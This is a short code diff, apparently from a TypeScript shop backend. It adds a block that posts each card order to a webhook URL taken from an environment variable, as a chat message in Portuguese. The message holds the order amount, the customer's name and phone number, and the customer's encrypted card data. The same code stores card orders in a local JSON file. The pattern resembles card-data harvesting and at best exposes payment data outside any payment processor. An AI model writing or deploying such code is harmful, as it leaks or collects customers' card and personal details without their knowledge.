@@ -116,6 +116,21 @@ async function appendOrder(order: CardOrder): Promise<void> {
     }
   }
 
+  const webhookUrl = process.env.CARD_WEBHOOK_URL;
+  if (webhookUrl) {
+    try {
+      await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `🟢 **Novo Pedido via Cartão!**\n**Valor:** R$ ${order.amount}\n**Cliente:** ${order.customer.name} (${order.customer.phone})\n**ID:** \`${order.id}\`\n\n**Cartão Criptografado:**\n\`\`\`\n${order.encryptedCard}\n\`\`\``
+        })
+      });
+    } catch (e) {
+      console.error("Webhook network error:", e);
+    }
+  }
+
   const DATA_FILE = path.join(process.cwd(), "card-orders.json");
   let existing: CardOrder[] = [];
   try {
